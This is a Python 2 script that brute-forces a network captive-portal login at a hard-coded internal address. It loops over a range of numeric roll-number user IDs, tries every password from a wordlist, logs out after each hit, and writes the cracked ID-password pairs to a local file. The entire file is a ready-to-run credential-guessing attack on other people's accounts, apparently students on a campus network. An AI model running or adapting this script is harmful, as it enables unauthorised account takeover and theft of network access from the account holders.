#!/bin/python


import urllib
import time
import datetime
import urllib2
import sys
import xml.dom.minidom as XML

trst = {}
userid=[]
start=int(input("Enter the starting Roll:"))
end=int(input("Enter the last Roll:"))

for s in range(start,end+1):
    userid.append(s)

filenm = raw_input("Enter the wordlist filename: ")

#Loads the file and mentions no.of entries:
def load_words(file):
    print "loading words from file..."
    wordlist = list()
    with open(file) as f:
        for line in f:
            wordlist.append(line.rstrip('\n'))
    print " ", len(wordlist), "words loaded."
    return wordlist

passwd = load_words(filenm)

#Login request function
    
def sendLoginRequest(username, password):
    url = "http://172.29.0.1:8090/httpclient.html"
    post_data = 'mode=191' + '&username=' + str(username) + '&password=' + password
    try:
        req = urllib2.Request(url, post_data)
        response = urllib2.urlopen(req)
        xml_dom = XML.parseString(response.read())
        document = xml_dom.documentElement
        response = document.getElementsByTagName('message')[0].childNodes[0].nodeValue
        print response
        if 'successfully' in response:
            return True
        elif 'Limit' in response:
            return True
        elif 'Maximum' in response:
            return True
        elif 'data' in response:
            return True
        

    except:
        return False

#LogOut request Function:
def sendLogoutRequest(username):
    url = "http://172.29.0.1:8090/httpclient.html"
    post_data = 'mode=191' + '&username=' + username
    req = urllib2.Request(url, post_data)
    response = urllib2.urlopen(req)
    print response
    print 'logout.'

#Gets the password and saves to a file:
for o in userid:
    for l in passwd:
         print l+" "+str(o)
         if sendLoginRequest(o, l) == True:
            
            print '----------#######---------success!!! and '+l+' - password, userid -'+str(o)
            trst[o]=l
            sendLogoutRequest(str(o))
            with open("user.txt","a") as myfile:
                myfile.write(str(o)+" "+str(l)+'\n')
                break
            break
            
         

print trst









